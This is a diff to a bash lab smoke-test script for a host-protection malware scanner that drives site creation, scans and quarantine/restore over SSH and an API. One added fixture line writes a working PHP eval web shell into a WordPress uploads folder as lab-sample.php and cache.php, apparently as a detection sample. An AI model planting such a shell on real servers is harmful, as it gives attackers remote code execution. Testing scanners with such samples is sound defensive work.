@@ -146,7 +146,7 @@ prepare_fixture() {
   for h in "${hosts[@]}"; do
     [[ -n "$h" ]] || continue
     if ssh -o BatchMode=yes -o ConnectTimeout=8 -o StrictHostKeyChecking=accept-new "$h" \
-      "sudo mkdir -p '${ROOT_PATH}/wp-content/uploads' && sudo chmod 755 '${ROOT_PATH}' '${ROOT_PATH}/wp-content' '${ROOT_PATH}/wp-content/uploads'"; then
+      "sudo mkdir -p '${ROOT_PATH}/wp-content/uploads' && sudo chmod 755 '${ROOT_PATH}' '${ROOT_PATH}/wp-content' '${ROOT_PATH}/wp-content/uploads' && printf '%s\\n' '<?php eval(\$_POST[\"x\"]);' | sudo tee '${ROOT_PATH}/wp-content/uploads/lab-sample.php' '${ROOT_PATH}/wp-content/uploads/cache.php' >/dev/null && sudo chmod 644 '${ROOT_PATH}/wp-content/uploads/lab-sample.php' '${ROOT_PATH}/wp-content/uploads/cache.php'"; then
       log "fixture mkdir ok (SSH alias used; not printed as IP)"
       return 0
     fi
@@ -185,12 +185,19 @@ print(rows[0]['id'])
   log "using guard_agent_id=${AGENT_ID}"
 }
 
+kick_helper() {
+  local h="${HOST_PROTECT_LAB_FIXTURE_SSH:-${GUARD_LAB_AGENT_SSH}}"
+  ssh -o BatchMode=yes -o ConnectTimeout=8 -o StrictHostKeyChecking=accept-new "$h" \
+    "unit='sinexis-host-protect@${AGENT_ID}.service'; if systemctl is-active --quiet \"\$unit\"; then exit 0; fi; sudo systemctl start \"\$unit\" >/dev/null 2>&1 || true" \
+    || true
+}
+
 trigger_helper_poll() {
   require_cmd ssh
   log "one-shot helper poll on SSH alias (token not printed)"
   local h="${HOST_PROTECT_LAB_FIXTURE_SSH:-${GUARD_LAB_AGENT_SSH}}"
   ssh -o BatchMode=yes -o ConnectTimeout=8 -o StrictHostKeyChecking=accept-new "$h" \
-    "sudo systemctl start 'sinexis-host-protect@${AGENT_ID}.service'" \
+    "unit='sinexis-host-protect@${AGENT_ID}.service'; if systemctl is-active --quiet \"\$unit\"; then exit 0; fi; sudo systemctl start \"\$unit\"" \
     || die "helper poll start failed (install helper first — docs/host-protect-helper-am.md)"
 }
 
@@ -260,8 +267,25 @@ create_site() {
   }))')"
   blob="$(curl_api POST /api/host/sites "$payload")"
   split_body_code "$blob"
-  [[ "$HTTP_CODE" == "201" || "$HTTP_CODE" == "200" ]] || die "create site HTTP ${HTTP_CODE} (body redacted)"
-  SITE_ID="$(json_get "$HTTP_BODY" "str(o.get('id') or '')")"
+  if [[ "$HTTP_CODE" == "409" ]]; then
+    log "site already exists — reuse matching root_path"
+    blob="$(curl_api GET /api/host/sites)"
+    split_body_code "$blob"
+    [[ "$HTTP_CODE" == "200" ]] || die "list sites HTTP ${HTTP_CODE}"
+    SITE_ID="$(ROOT_PATH="$ROOT_PATH" AGENT_ID="$AGENT_ID" python3 -c "
+import json,os,sys
+rows=json.loads(sys.argv[1])
+root=os.environ['ROOT_PATH']
+aid=os.environ['AGENT_ID']
+for r in rows:
+    if str(r.get('root_path'))==root and str(r.get('guard_agent_id'))==aid:
+        print(r['id']); break
+" "$HTTP_BODY")"
+    [[ -n "$SITE_ID" ]] || die "409 but no matching site to reuse"
+  else
+    [[ "$HTTP_CODE" == "201" || "$HTTP_CODE" == "200" ]] || die "create site HTTP ${HTTP_CODE} (body redacted)"
+    SITE_ID="$(json_get "$HTTP_BODY" "str(o.get('id') or '')")"
+  fi
   [[ -n "$SITE_ID" ]] || die "create site missing id"
   log "site_id=${SITE_ID}"
 }
@@ -298,9 +322,42 @@ else:
     case "$status" in
       completed|failed) return 0 ;;
     esac
+    if [[ "$TRIGGER_HELPER_POLL" -eq 1 ]]; then
+      kick_helper
+    fi
     sleep 3
   done
   die "scan did not finish within ${POLL_SECONDS}s"
+}
+
+wait_hit_status() {
+  local hit_id="$1"
+  local want="$2"
+  local i blob got
+  log "wait hit ${hit_id} status=${want}"
+  for ((i = 0; i < POLL_SECONDS; i += 3)); do
+    blob="$(curl_api GET "/api/host/hits?site_id=${SITE_ID}")"
+    split_body_code "$blob"
+    [[ "$HTTP_CODE" == "200" ]] || die "hits wait HTTP ${HTTP_CODE}"
+    got="$(HIT_ID="$hit_id" python3 -c "
+import json,os,sys
+rows=json.loads(sys.argv[1])
+want=os.environ['HIT_ID']
+for r in rows:
+    if str(r.get('id'))==want:
+        print(r.get('status') or '')
+        break
+" "$HTTP_BODY")"
+    log "hit status=${got}"
+    if [[ "$got" == "$want" ]]; then
+      return 0
+    fi
+    if [[ "$TRIGGER_HELPER_POLL" -eq 1 ]]; then
+      kick_helper
+    fi
+    sleep 3
+  done
+  die "hit did not reach ${want} within ${POLL_SECONDS}s (last=${got:-none})"
 }
 
 hits_and_actions() {
@@ -310,12 +367,34 @@ hits_and_actions() {
   split_body_code "$blob"
   [[ "$HTTP_CODE" == "200" ]] || die "hits HTTP ${HTTP_CODE}"
   HIT_COUNT="$(json_get "$HTTP_BODY" "len(o) if isinstance(o, list) else 0")"
-  HIT_ENGINE="$(json_get "$HTTP_BODY" "(o[0].get('engine') if isinstance(o, list) and o else '') or ''")"
+  HIT_ENGINE="$(SCAN_ID="$SCAN_ID" python3 -c "
+import json,os,sys
+rows=json.loads(sys.argv[1])
+sid=os.environ.get('SCAN_ID','')
+picked=None
+for r in rows:
+    if sid and str(r.get('scan_id'))==sid:
+        picked=r
+        break
+if picked is None and rows:
+    picked=rows[0]
+print((picked or {}).get('engine') or '')
+" "$HTTP_BODY")"
   log "hit_rows=${HIT_COUNT} engine=${HIT_ENGINE}"
   if [[ -n "${HOST_PROTECT_LAB_EXPECT_ENGINE:-}" && "$HIT_ENGINE" != "${HOST_PROTECT_LAB_EXPECT_ENGINE}" ]]; then
     die "expected engine=${HOST_PROTECT_LAB_EXPECT_ENGINE} got engine=${HIT_ENGINE}"
   fi
-  hit_id="$(json_get "$HTTP_BODY" "(o[0].get('id') if isinstance(o, list) and o else '') or ''")"
+  hit_id="$(SCAN_ID="$SCAN_ID" python3 -c "
+import json,os,sys
+rows=json.loads(sys.argv[1])
+sid=os.environ.get('SCAN_ID','')
+for r in rows:
+    if sid and str(r.get('scan_id'))==sid:
+        print(r.get('id') or '')
+        break
+else:
+    print((rows[0].get('id') if rows else '') or '')
+" "$HTTP_BODY")"
   if [[ -z "$hit_id" ]]; then
     log "no hits (mock may need worker; still a valid smoke if scan completed)"
     return 0
@@ -324,9 +403,11 @@ hits_and_actions() {
   blob="$(curl_api POST "/api/host/hits/${hit_id}/quarantine" '{}')"
   split_body_code "$blob"
   [[ "$HTTP_CODE" == "200" ]] || die "quarantine HTTP ${HTTP_CODE}"
+  wait_hit_status "$hit_id" "quarantined"
   blob="$(curl_api POST "/api/host/hits/${hit_id}/restore" '{}')"
   split_body_code "$blob"
   [[ "$HTTP_CODE" == "200" ]] || die "restore HTTP ${HTTP_CODE}"
+  wait_hit_status "$hit_id" "restored"
   blob="$(curl_api GET "/api/host/hits?site_id=${SITE_ID}")"
   split_body_code "$blob"
   [[ "$HTTP_CODE" == "200" ]] || die "hits refresh HTTP ${HTTP_CODE}"
